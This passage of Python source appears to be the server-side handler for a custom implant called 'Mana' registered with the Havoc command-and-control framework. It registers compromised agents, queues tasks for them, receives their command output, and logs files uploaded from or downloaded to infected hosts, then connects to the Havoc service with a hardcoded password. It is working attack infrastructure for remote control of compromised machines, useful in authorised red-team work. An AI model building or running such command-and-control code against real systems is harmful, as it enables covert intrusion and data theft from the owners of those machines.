                    RegisterInfo[ "OS Arch" ] = "Unknown (" + RegisterInfo[ "OS Arch" ] + ")"

                # Process Arch
                if RegisterInfo[ "Process Arch" ] == 0:
                    RegisterInfo[ "Process Arch" ] = "Unknown"

                elif RegisterInfo[ "Process Arch" ] == 1:
                    RegisterInfo[ "Process Arch" ] = "x86"

                elif RegisterInfo[ "Process Arch" ] == 2:
                    RegisterInfo[ "Process Arch" ] = "x64"

                elif RegisterInfo[ "Process Arch" ] == 3:
                    RegisterInfo[ "Process Arch" ] = "IA64"

                self.register( agent_header, RegisterInfo )

                return RegisterInfo[ 'AgentID' ].to_bytes( 4, 'little' ) # return the agent id to the agent

            else:
                print("[-] Is not agent register request")

        else:
            #print( f"[*] Something else: {Command}" )

            AgentID = response[ "Agent" ][ "NameID" ]

            if Command == COMMAND_REGISTER:
                print("[*] Agent re-registering, returning existing ID")
                return int(AgentID, 16).to_bytes(4, 'little')

            if Command == COMMAND_GET_JOB:
                print( "[*] Get list of jobs and return it." )

                Tasks = self.get_task_queue( response[ "Agent" ] )

                # if there is no job just send back a COMMAND_NO_JOB command.
                if len(Tasks) == 0:
                    Tasks = COMMAND_NO_JOB.to_bytes( 4, 'little' )

                print( f"Tasks: {Tasks.hex()}" )
                return Tasks

            elif Command == COMMAND_OUTPUT:

                # Use parse_bytes() instead of parse_str() to handle non-UTF-8
                OutputBytes = response_parser.parse_bytes()
                
                # Decode with error handling
                try:
                    Output = OutputBytes.decode('utf-8')
                except UnicodeDecodeError:
                    # Fallback to latin-1 (accepts all byte values)
                    Output = OutputBytes.decode('latin-1', errors='replace')
                
                self.console_message(AgentID, "Good", "Output:", Output)

            elif Command == COMMAND_UPLOAD:

                FileSize = response_parser.parse_int()
                FileName = response_parser.parse_str()

                self.console_message( AgentID, "Good", f"File was uploaded: {FileName} ({FileSize} bytes)", "" )

            elif Command == COMMAND_DOWNLOAD:

                FileName    = response_parser.parse_str()
                FileContent = response_parser.parse_str()

                self.console_message( AgentID, "Good", f"File was downloaded: {FileName} ({len(FileContent)} bytes)", "" )

                self.download_file( AgentID, FileName, len(FileContent), FileContent )
            
            elif Command == COMMAND_EXIT:
                self.console_message( AgentID, "exiting process", "Info", "[!] Exiting process..." )

            else:
                self.console_message( AgentID, "Error", "Command not found: %4x" % Command, "" )

        return b''


def main():
    Havoc_Mana = Mana()

    print("[*] Connect to Havoc service api")
    Havoc_Service = HavocService(
        endpoint="wss://127.0.0.1:40056/test",
        password="password1234"
    )

    print("[*] Register Mana to Havoc")
    Havoc_Service.register_agent(Havoc_Mana)


if __name__ == '__main__':
    main()